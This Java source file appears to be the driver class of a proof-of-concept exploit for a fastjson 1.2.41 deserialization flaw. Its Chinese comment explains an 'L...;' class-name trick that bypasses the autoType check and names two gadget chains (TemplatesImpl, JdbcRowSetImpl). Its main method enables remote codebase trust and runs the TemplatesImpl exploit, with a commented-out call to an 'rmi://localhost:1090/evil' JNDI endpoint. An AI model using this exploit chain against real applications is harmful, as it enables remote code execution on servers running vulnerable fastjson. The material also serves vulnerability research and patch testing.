package org.lain.poc;

import org.lain.poc.poclist.JdbcRowSetImplPoC;
import org.lain.poc.poclist.TemplatesImplPoc;

/**
 * @author: ZH3FENG
 * @Date: 下午7:53 2017/12/11
 * @Modified By:
 * @Description: 针对fastjson最新版（1.2.41）的PoC，
 *               包含了两种Gadget：
 *               1）com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
 *               2）com.sun.rowset.JdbcRowSetImpl
 *
 *               利用了com.alibaba.fastjson.util.TypeUtils->loadClass(Line:1055)加载类时LObject_path;->变换为Object_path，
 *               LObject_path;绕过ParserConfig.checkAutoType(Line:808)startWith()
 *
 *               需要开启 autoTypeSupport，fastJson在早期修复时增加的开关
 *               https://github.com/alibaba/fastjson/wiki/security_update_20170315
 *               官方已经警告了开启会有风险了，所以实际情况这个应该成为一个限制
 *
 *
 *               reference: https://paper.tuisec.win/detail/cc78c345ff5ce1b
 *
 */
public class App 
{
    public static void main(String[] args )throws Exception
    {

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");

        //JdbcRowSetImplPoC.testJdbcRowSetImpl("rmi://localhost:1090/evil");

       TemplatesImplPoc.testTemplatesImpl();
    }
}
